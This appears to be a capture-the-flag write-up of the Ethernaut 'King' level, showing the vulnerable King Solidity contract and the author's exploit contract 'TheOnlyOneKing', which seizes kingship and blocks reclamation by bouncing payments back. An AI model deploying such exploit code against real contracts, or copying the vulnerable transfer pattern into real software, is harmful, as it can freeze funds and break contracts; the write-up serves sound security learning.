---
title: King
type: blog
---

Difficulty: ⭐⭐⭐
Date: 2 février 2024
URL: https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6
État: Terminé

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

<aside>
💡 Most of Ethernaut's levels try to expose (in an oversimplified form of 
course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

</aside>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface King {
  function prize() external returns(uint);
  function owner() external returns(address);
  receive() external payable;
  function _king() external view returns (address);
}

contract TheOnlyOneKing {
  King fakeKing;

  constructor(address payable _fakeKing) {
    fakeKing = King(_fakeKing);
  }

  function becomeTheOnlyOneKing() public payable {
    uint prize = fakeKing.prize();
    (bool success,) = address(fakeKing).call{value: prize}("");
    require(success, 'failed become the only one king');
  }

  receive() external payable {
    if (fakeKing._king() != address(this)) {
      payable(fakeKing).transfer(msg.value);
    }
  }
}
```

This solution is overkill since we can just forbid the to send ether to a contract just by not implementing any fallback function. But this solution is more fun since it’s like TheOnlyOneKing is always fighting back for his crown ! 👑
